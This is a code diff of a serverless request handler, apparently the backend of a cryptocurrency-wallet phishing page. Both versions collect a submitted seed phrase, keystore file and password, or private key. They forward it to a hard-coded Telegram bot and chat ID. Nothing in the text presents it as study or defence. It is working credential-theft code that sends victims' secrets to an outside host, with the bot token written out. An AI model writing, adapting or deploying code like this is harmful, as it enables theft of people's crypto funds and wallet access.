@@ -1,46 +1,39 @@
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).json({ message: 'Only POST requests allowed' });
+    return res.status(405).send('Method Not Allowed');
   }
 
-  const botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
-  const chatId = '1129243973';
-  const { type, walletName, phrase, keystore, password, privateKey } = req.body;
+  const { type, phrase, keystore, password, privateKey, walletName } = req.body;
 
-  let message = `🟡 Wallet: ${walletName}\n`;
+  // Construct message based on type
+  let message = `🛑 New ${type.toUpperCase()} Submission\nWallet: ${walletName}\n`;
 
-  switch (type) {
-    case 'phrase':
-      message += `🔑 Phrase:\n${phrase}`;
-      break;
-    case 'keystore':
-      message += `📁 Keystore:\n${keystore}\n🔒 Password: ${password}`;
-      break;
-    case 'privatekey':
-      message += `🔐 Private Key:\n${privateKey}`;
-      break;
-    default:
-      return res.status(400).json({ message: 'Invalid type' });
-  }
+  if (type === 'phrase') message += `Phrase: ${phrase}`;
+  if (type === 'keystore') message += `Keystore: ${keystore}\nPassword: ${password}`;
+  if (type === 'privatekey') message += `Private Key: ${privateKey}`;
 
-  const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const TELEGRAM_BOT_TOKEN = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
+  const TELEGRAM_CHAT_ID = '1129243973';
+
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   try {
-    const response = await fetch(telegramURL, {
+    const tgRes = await fetch(telegramUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'HTML',
-      }),
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
     });
 
-    const data = await response.json();
-    if (!data.ok) throw new Error(data.description);
+    if (!tgRes.ok) {
+      throw new Error('Telegram API failed');
+    }
 
-    return res.status(200).json({ message: 'Sent to Telegram successfully' });
+    res.status(200).json({ status: 'success' });
   } catch (err) {
-    return res.status(500).json({ message: err.message });
+    console.error(err);
+    res.status(500).json({ status: 'error', message: err.message });
   }
 }
